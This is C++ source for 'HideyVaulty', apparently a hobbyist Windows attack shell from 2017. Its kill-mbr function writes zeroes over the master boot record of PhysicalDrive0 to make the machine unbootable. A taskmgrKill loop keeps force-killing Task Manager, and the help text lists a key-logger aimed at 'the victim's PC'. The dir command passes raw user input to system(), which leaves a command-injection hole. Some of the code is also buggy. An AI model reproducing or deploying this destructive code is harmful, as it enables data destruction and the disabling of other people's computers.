#include "stdafx.h"
#include "HideyVaultyShell.h"
#include <iostream>
#include <WinUser.h>
#include "Logger.h"

int main();
int mainAuth();

ShellAuth *shellAuth = new ShellAuth();

// Function that outputs and ASCII based splash screen
void ShellAuth::showSplashAuth() {
	std::cout <<
		" _   _ _     _            _   _             _ _                   \n"
		"| | | (_)   | |          | | | |           | | |                  \n"
		"| |_| |_  __| | ___ _   _| | | | __ _ _   _| | |_ _   _           \n"
		"|  _  | |/ _` |/ _ \\ | | | | | |/ _` | | | | | __| | | |         \n"
		"| | | | | (_| |  __/ |_| \\ \\_/ / (_| | |_| | | |_| |_| |        \n"
		"\\_| |_/_|\\__,_|\\___|\\__, |\\___/ \\__,_|\\__,_|_|\\__|\\__, |  \n"
		"                     __/ |                         __/ | * Built by Jack Williams 2017 \n";
	std::cout << "                    |___/                         |___/  * For a list of commands, type " << '"' << "help" << '"' << std::endl;

	for (int i = 0; i < 95; i++) {
		std::cout << "=" << std::flush;
	}

	std::cout << '\n';
}

// System for managing the shell prompt
void ShellAuth::showPromptAuth() {
	std::cout << "HideyVaulty Shell (Authenticated) > " << std::flush;
	getline(std::cin, userInput);
	if (userInput == "") std::cout << std::endl;
	commandValidityCheckerAuth(userInput);
}

// System for initializing the account login process
void ShellAuth::loginInitAuth() {
	std::cout << "You are already logged in! \n" << std::endl;
	shellAuth->showPromptAuth();
}

// System for checking if command is valid
void ShellAuth::commandValidityCheckerAuth(std::string userInput) {
	if (userInput == "help") {
		shellAuth->helpOutputAuth();
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput == "") {
		shellAuth->showPromptAuth();
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput.find("dir") != std::string::npos) {
		shellAuth->dirCommand();
	}
	else if (userInput == "about") {
		shellAuth->aboutOutputAuth();
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput == "kill-mbr") {
		shellAuth->killMBR();
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput == "key-logger") {
		shellAuth->keyLogger();
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput == "account --logout") {
		main();
		commandValidityChecker(userInput);
	}
	else if (userInput == "clear") {
		system("cls");
		shellAuth->showPromptAuth();
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput == "quit") {
		shellAuth->quitProgramAuth();
	}
	else if (userInput == "account --create") {
		std::cout << "Creating a new account will overwrite your previous account credentials. Proceed? (Y/N) > " << std::flush;
		getline(std::cin, userInput);
		if (userInput == "Y" || userInput == "y") {
			shellAuth->loginInit();

		}
		else if (userInput == "N" || userInput == "n") {
			shellAuth->showPromptAuth();
			shellAuth->commandValidityCheckerAuth(userInput);
		}
		else {
			std::cout << '"' << userInput << '"' << " is not a valid option\n" << std::endl;
			shellAuth->quitProgramAuth();
		}
		commandValidityCheckerAuth(userInput);
	}
	else if (userInput == "account --login") {
		shellAuth->accountLoginAuth();
		commandValidityCheckerAuth(userInput);
	}
	else {
		std::cout << '"' << userInput << '"' << " is not a valid command\n" << std::endl;
		shellAuth->showPromptAuth();
		commandValidityCheckerAuth(userInput);
	}
}

// Account login system
void ShellAuth::accountLoginAuth() {
	shellAuth->loginInitAuth();
}

// Function for the "help" command
void ShellAuth::helpOutputAuth() {
	std::cout << "help - Displays all possible commands.\n"
		"account - Takes an account option parameter, useless on its own.\n"
		"\t--create\n"
		"\t--login\n"
		"\t--logout\n"
		"about - Displays information about HideyVaulty.\n"
		"dir (directory) - Displays files and subdirectories inside selected directory. (If any).\n"
		"kill-mbr - Overwrites the first 512 bytes on the first physical drive with zeroes, destroying the MBR. \n"
		"key-logger - Logs keystrokes on the victim's PC. (experimental) \n"
		"clear - Clears the screen.\n"
		"quit - Quits the program.\n"
		"\n";
	shellAuth->showPromptAuth();
}

// Function for the "dir" command
void ShellAuth::dirCommand() {
	std::string dirInput = userInput;
	std::string directory = dirInput.erase(0, 4);

	if (userInput == "") {
		system("dir | findstr /i \"AM PM\"");
		std::cout << '\n';
		shellAuth->showPromptAuth();
	}

	std::cout << "Files in: " << directory << std::endl;

	std::string isDirectoryCommand = userInput + " > nul 2> nul";
	std::string dirCommand = userInput + " | findstr /i \"AM PM\"";

	int isDirectory = system(isDirectoryCommand.c_str());
	if (isDirectory == 1) {
		std::cout << directory << " is not a valid directory. \n" << std::endl;
	}
	system(dirCommand.c_str());
	std::cout << '\n';
	shellAuth->showPromptAuth();
}

// Function that disables task manager (To be fixed)
void ShellAuth::taskmgrKill() {
	while (true) {
		int killTaskMgr = system("taskkill /f /im taskmgr.exe 2> nul > nul");
		if (killTaskMgr == 5) {
			std::cout << "You do not have the privileges to run this command.\n" << std::endl;
		}
		std::cout << "Script succeeded.\n" << std::endl;
	}
}

// Function that overwrites the master boot record with zeroes
void ShellAuth::killMBR() {
	DWORD write;
	char mbrData[MBR_SIZE];

	ZeroMemory(&mbrData, (sizeof mbrData));

	std::cout << "This operation will make computer unbootable. Proceed? (Y/N) > " << std::flush;
	getline(std::cin, userInput);
	while (true) {
		if (userInput == "Y" || userInput == "y") {
			std::cout << "Type \"I am fully responsible for the damage I will cause to this PC (Case-sensitive) > " << std::flush;
			getline(std::cin, userInput);
			if (userInput == "I am fully responsible for the damage I will cause to this PC") {
				HANDLE MasterBootRecord = CreateFile((LPCWSTR)"\\\\.\\PhysicalDrive0",
					GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
				if (WriteFile(MasterBootRecord, mbrData, MBR_SIZE, &write, NULL) == TRUE) {
					std::cout << "\nMBR annihilated!\n" << std::endl;
					shellAuth->showPromptAuth();
					break;
				}
				else {
					std::cout << "You do not have the privileges to run this command.\n" << std::endl;
					shellAuth->showPromptAuth();
					break;
				}
				CloseHandle(MasterBootRecord);
			}
			else {
				std::cout << "Quitting kill-mbr...\n";
				shellAuth->showPromptAuth();
				break;
			}
		}
		else if (userInput == "N" || userInput == "n") {
			shellAuth->showPromptAuth();
			break;
		}
		else {
			std::cout << '"' << userInput << '"' << " is not a valid option\n" << std::endl;
		}
	}
}

// Function for the "about" command
void ShellAuth::aboutOutputAuth() {
	std::cout << "HideyVaulty - Built by Jack Williams (HackoTron) 2017\n"
		<< "Version 0.7 Beta\n" << std::endl;
	shellAuth->showPromptAuth();
}

// Function for the "quit" command
void ShellAuth::quitProgramAuth() {
	std::cout << "Are you sure you want to quit? (Y/N) > " << std::flush;
	getline(std::cin, userInput);
	if (userInput == "Y" || userInput == "y") {
		delete shellAuth;
		exit(0);
	}
	else if (userInput == "N" || userInput == "n") {
		std::cout << std::endl;
		shellAuth->showPromptAuth();
		shellAuth->commandValidityCheckerAuth(userInput);
	}
	else {
		std::cout << '"' << userInput << '"' << " is not a valid option\n" << std::endl;
		shellAuth->quitProgramAuth();
	}
}

